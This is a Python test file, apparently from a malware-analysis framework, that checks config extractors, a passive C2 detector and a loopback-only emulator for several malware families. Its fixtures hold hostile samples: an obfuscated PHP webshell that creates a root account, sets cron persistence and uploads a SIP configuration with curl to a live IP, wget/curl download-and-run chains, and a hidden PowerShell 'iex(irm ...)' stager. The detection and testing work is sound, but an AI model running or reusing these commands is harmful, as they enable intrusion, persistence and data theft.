"""第2バッチで追加した解析・検出・合成エミュレーターの回帰試験。"""

from __future__ import annotations

import base64
import codecs
import importlib.util
import json
from pathlib import Path
import socket
import struct
import sys
import threading
import time

import pytest


FRAMEWORK = Path(__file__).parents[1]
COMMON = FRAMEWORK / "common"
if str(COMMON) not in sys.path:
    sys.path.insert(0, str(COMMON))

import loopback_emulator  # noqa: E402
import passive_c2_detector  # noqa: E402


def load_family_module(family: str):
    directory = FRAMEWORK / "malware" / family
    spec = importlib.util.spec_from_file_location(
        f"test_{family}_extractor", directory / "extract_config.py"
    )
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def minimal_riscv_elf(payload: bytes) -> bytes:
    ident = b"\x7fELF" + bytes([2, 1, 1]) + b"\0" * 9
    header = struct.pack(
        "<HHIQQQIHHHHHH",
        2,
        243,
        1,
        0,
        0,
        0,
        0,
        64,
        56,
        0,
        0,
        0,
        0,
    )
    return ident + header + payload


def test_xmrig_version_architecture_and_pool_roles() -> None:
    module = load_family_module("xmrig")
    data = minimal_riscv_elf(
        b"XMRIG_VERSION\x006.26.0\x00XMRig\x00RandomX\x00"
        b"stratum+ssl://pool.example:443\x00donate.ssl.xmrig.com\x00"
    )
    result = module.extract_config(data)
    assert result["classification_confidence"] == "confirmed"
    assert result["version"] == "6.26.0"
    assert result["architecture"] == "riscv64"
    assert result["operator_pool_candidates"][0]["host"] == "pool.example"
    assert result["donation_pools"][0]["is_operator_pool"] is False


def test_jomangy_recursive_layers_and_roles() -> None:
    module = load_family_module("jomangy")
    decoded = """<?php
session_start();
include_once "/var/www/html/libs/paloSantoDB.class.php";
system("useradd -s /bin/bash -ou 0 -g 0 analyst");
system("wget http://45.95.147.178/k.php -O /var/lib/asterisk/bin/devnull");
system("crontab -r; echo '*/3 * * * * /var/lib/asterisk/bin/devnull'");
system('curl -F "file=@/etc/asterisk/sip_additional.conf" http://45.95.147.178/hima_data/index.php');
?>"""
    rotated = codecs.encode(decoded, "rot_13").encode()
    outer = (
        b"<?php $x=base64_decode('"
        + base64.b64encode(rotated)
        + b"'); $y=str_rot13($x); eval($y); ?>"
    )
    result = module.extract_config(outer)
    assert result["classification_confidence"] == "confirmed"
    assert result["c2_or_exfiltration"][0]["role"] == "data_exfiltration"
    assert result["behaviors"]["root_account_creation"] is True
    assert result["behaviors"]["cron_persistence"] is True
    assert "/etc/asterisk/sip_additional.conf" in result["targeted_configuration_files"]


def test_jomangy_passive_detector_requires_path_and_method() -> None:
    profile_path = FRAMEWORK / "malware" / "jomangy" / "c2_profile.json"
    profile = json.loads(profile_path.read_text(encoding="utf-8"))
    observations = [
        {
            "destination_host": "45.95.147.178",
            "destination_port": 80,
            "http": {"path": "/hima_data/index.php", "method": "POST"},
        }
    ]
    detected = passive_c2_detector.detect(profile, observations)
    assert detected["matches"][0]["verdict"] == "confirmed_c2"
    assert set(detected["shodan"]["queries"]) == {
        "ip:45.95.147.178 port:80",
        "ip:160.119.69.4 port:80",
    }


def test_linux_downloader_role_separation() -> None:
    module = load_family_module("linux_downloader")
    data = (
        b"\x7fELF wget -q http://94.154.43.42/x86 -O x86 "
        b"curl -fsSL http://94.154.43.42/x86 -o x86 "
        b"chmod 777 x86 ./x86 rm x86 binary"
    )
    result = module.extract_config(data)
    assert result["classification_confidence"] == "confirmed"
    assert result["download_endpoints"][0]["is_c2"] is False
    assert result["execution_chain"]["curl_fallback"] is True


def test_clickfix_html_and_powershell_roles() -> None:
    module = load_family_module("clickfix_booking")
    html = b"""
    booking.com getCommandFromServer get_command=1 verification_id
    fetch('/campaign?get_command=1'); method: 'POST';
    clipboardData.setData('text/plain', command)
    """
    html_result = module.extract_config(html)
    assert html_result["artifact_kind"] == "clickfix_html"
    assert html_result["behaviors"]["clipboard_command_injection"] is True
    assert html_result["endpoints"][0]["host"] is None

    powershell = (
        b"Start-Process -WindowStyle Hidden powershell "
        b"-Args '-ExecutionPolicy Bypass -c iex(irm zjcounty.com)'"
    )
    ps_result = module.extract_config(powershell)
    assert ps_result["artifact_kind"] == "powershell_stager"
    assert ps_result["endpoints"][0]["host"] == "zjcounty.com"


def test_clickfix_repetitive_overlay_helper() -> None:
    module = load_family_module("clickfix_booking")
    result = module._repetitive_padding(b"pqrs" * 4096)
    assert result["period"] == 4
    assert result["pattern_hex"] == "70717273"


def test_batch2_profiles_use_loopback_only_synthetic_emulator() -> None:
    for family in ("xmrig", "jomangy", "linux_downloader", "clickfix_booking"):
        profile_path = FRAMEWORK / "malware" / family / "c2_profile.json"
        profile = json.loads(profile_path.read_text(encoding="utf-8"))
        assert profile["emulator"]["loopback_only"] is True
        assert profile["emulator"]["malware_protocol_compatible"] is False

        reserve = socket.socket()
        reserve.bind(("127.0.0.1", 0))
        port = reserve.getsockname()[1]
        reserve.close()
        output: list[dict] = []
        worker = threading.Thread(
            target=lambda p=port, name=profile["emulator"]["profile"]: output.append(
                loopback_emulator.serve_once("127.0.0.1", p, name, 2.0)
            ),
            daemon=True,
        )
        worker.start()
        client = None
        for _ in range(50):
            try:
                client = socket.create_connection(("127.0.0.1", port), timeout=0.2)
                break
            except OSError:
                time.sleep(0.01)
        assert client is not None
        with client:
            assert client.recv(64).startswith(loopback_emulator.SYNTHETIC_PREFIX)
        worker.join(2)
        assert output[0]["malware_protocol_compatible"] is False


def test_batch2_yara_rules_compile() -> None:
    yara = pytest.importorskip("yara")
    for family in ("xmrig", "jomangy", "linux_downloader", "clickfix_booking"):
        rule = next((FRAMEWORK / "malware" / family / "rules").glob("*.yar"))
        yara.compile(filepath=str(rule))
